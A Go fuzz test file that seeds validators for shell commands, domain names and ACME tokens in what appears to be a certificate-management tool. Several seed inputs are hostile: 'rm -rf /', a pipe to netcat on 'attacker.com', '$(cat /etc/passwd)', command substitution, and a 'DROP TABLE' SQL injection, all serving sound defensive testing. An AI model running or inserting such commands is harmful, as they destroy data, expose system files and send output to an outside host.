package validation

import "testing"

func FuzzValidateShellCommand(f *testing.F) {
	f.Add("nginx -s reload")
	f.Add("systemctl restart apache2")
	f.Add("echo hello; rm -rf /")
	f.Add("$(whoami)")
	f.Add("")
	f.Add("valid-command")
	f.Add("/usr/bin/openssl")
	f.Add("certctl-agent")
	f.Add("; rm -rf /")
	f.Add("| nc attacker.com 1234")
	f.Add("`whoami`")
	f.Add("$(cat /etc/passwd)")
	f.Fuzz(func(t *testing.T, cmd string) {
		// Should never panic, only return error for invalid input
		_ = ValidateShellCommand(cmd)
	})
}

func FuzzValidateDomainName(f *testing.F) {
	f.Add("example.com")
	f.Add("*.example.com")
	f.Add("a.b.c.d.example.co.uk")
	f.Add("")
	f.Add("; rm -rf /")
	f.Add("example.com; DROP TABLE certificates;")
	f.Add("*.*.example.com")
	f.Add("example..com")
	f.Add("-example.com")
	f.Add("example-.com")
	f.Add("sub domain.com")
	f.Add("@example.com")
	f.Add("example.com/admin")
	f.Add("//example.com")
	f.Fuzz(func(t *testing.T, domain string) {
		// Should never panic, only return error for invalid input
		_ = ValidateDomainName(domain)
	})
}

func FuzzValidateACMEToken(f *testing.F) {
	f.Add("validtoken123")
	f.Add("token-with-dash")
	f.Add("token_with_underscore")
	f.Add("")
	f.Add("token;invalid")
	f.Add("token|invalid")
	f.Add("token$(whoami)")
	f.Add("token\ninjection")
	f.Add("token with spaces")
	f.Fuzz(func(t *testing.T, token string) {
		// Should never panic, only return error for invalid input
		_ = ValidateACMEToken(token)
	})
}
